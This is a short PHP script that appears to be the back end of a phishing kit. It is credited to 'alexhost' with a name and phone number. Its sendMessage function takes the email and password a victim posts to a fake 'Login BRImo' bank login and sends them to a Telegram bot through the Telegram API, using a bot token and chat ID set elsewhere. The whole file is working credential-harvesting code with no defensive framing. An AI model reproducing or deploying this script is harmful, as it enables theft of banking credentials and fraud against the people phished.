<?php
/* -----------------------------------------------------
Tele Ress By alexhost
~ Alex Ariandi | 089509556668
------------------------------------------------------ */
include 'mailman.php';
function sendMessage($telegram_id, $message_text, $secret_token) {

    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode("Login BRImo"."\n\n"."Username: ". $email = $_POST['email']."\n"."Password: ". $password = $_POST['password']);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

/*----------------------
only basic POST method :
-----------------------*/
$telegram_id = $idtele;
$ngentot = 20;


/*--------------------------------
Isi TOKEN dibawah ini: 
--------------------------------*/
$secret_token = "$idbot";
sendMessage($telegram_id, $message_text, $secret_token);
?>